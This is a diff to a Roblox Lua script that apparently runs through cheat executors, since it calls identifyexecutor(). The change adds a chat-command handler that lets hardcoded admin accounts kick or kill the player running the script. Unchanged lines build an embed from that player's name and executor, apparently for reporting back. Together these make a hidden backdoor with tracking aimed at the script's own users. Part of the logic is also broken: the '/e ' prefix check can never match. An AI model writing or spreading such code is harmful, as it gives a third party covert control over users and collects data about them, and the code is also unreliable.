@@ -10,7 +10,7 @@ local Admins = {
 
 local Commands = {
     ["kick"] = function()
-        LocalPlayer:Kick("kicked by a tear developer")
+        LocalPlayer:Kick("You have been kicked by an admin.")
     end,
     ["kill"] = function()
         LocalPlayer.Character.Humanoid.Health = 0
@@ -83,22 +83,37 @@ Players.PlayerAdded:Connect(function(player)
     end
 end)
 
-local Executor = identifyexecutor()
-local ExecutorText = ""
+Players.PlayerAdded:Connect(function(player)
+    if Admins[player.UserId] then
+        player.Chatted:Connect(function(message)
+            local args = string.split(message, " ")
+            local command = args[1]:lower()
 
-if Executor == "Wave" then
-	ExecutorText = "Wave"
-elseif Executor == "Solara" then
-	ExecutorText = "Solara"
-elseif Executor == "Synapse Z" then
-	ExecutorText = "Synapse Z"
-elseif Executor == "AWP" then
-	ExecutorText = "AWP"
-elseif Executor == "Seliware" then
-	ExecutorText = "Seliware"
-else
-	ExecutorText = "Unknown"
-end
+            if command:sub(1, 3) == "/e " then
+                command = command:sub(4)
+                local targetName = args[2]
+                local target = FindUser(targetName)
+                
+                if target and Commands[command] then
+                    Commands[command](target)
+                end
+            else
+                local targetName = args[2]
+                local target = LocalPlayer
+                if targetName then
+                    target = FindUser(targetName) or LocalPlayer
+                end
+                
+                if Commands[command] then
+                    Commands[command](target)
+                end
+            end
+        end)
+    end
+end)
+
+local Executor = identifyexecutor()
+local ExecutorText = tostring(identifyexecutor())
 
 local embed = {
 	["title"] = LocalPlayer.Name,
